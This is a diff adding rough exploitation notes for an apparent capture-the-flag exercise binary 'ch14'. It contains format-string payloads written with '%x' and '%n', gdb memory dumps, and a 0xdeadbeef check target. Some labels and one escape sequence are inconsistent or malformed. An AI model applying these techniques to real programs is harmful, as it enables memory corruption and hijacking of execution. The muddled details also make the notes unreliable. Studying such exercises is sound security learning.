@@ -1,0 +1,54 @@
+Successful EIP Overwrite.
+
+./ch14 "`python -c 'print "AAAA" + "BBBB" + "CCCC" + "%x " * 5 + "%n "'`"
+
+
+Successful Arbitrary Code Execution
+
+./ch14 "`python -c 'print "AAAA" + "\x1c\xd3\xff\xff" + "CCCC" + "%x " * 5 + "%n "'`"
+
+
+Win Function:
+
+./ch14 "`python -c 'print "AAAA" + "\x1c\xd3\xff\xff" + "CCCC" + "%x " * 5 + "%n "'`"
+
+
+Beginning of "A" buf:
+
+(gdb) 
+0xffffd1fc:	0x41414141	0xffffd27c	0x43434343	0x35353635
+
+\xef\xbe\xad\x\xde
+
+
+
+
+Success = 0xdeadbeef
+
+\xef\xbe\xad\xde
+
+
+
+80485a7:	3d ef be ad de       	cmp    eax,0xdeadbeef
+80485ac:	74 0c                	je     80485ba <main+0xc6>
+
+\xa7\x85\x48\x80
+\xac\x85\x48\x80
+
+80485ba
+
+\xba\x85\x04\x08
+
+
+
+
+User input + Address of 01020304, beginning of format strings.
+
+(gdb) x/-2wx 0xffffd52b
+0xffffd523:	0xdeadbeef	0xffffd27c
+
+
+0xffffd52b:	"\001\002\003\004%x %x %x %x %x %n"
+
+
+Later in program "AAAA" is held at 0xffffd1fc
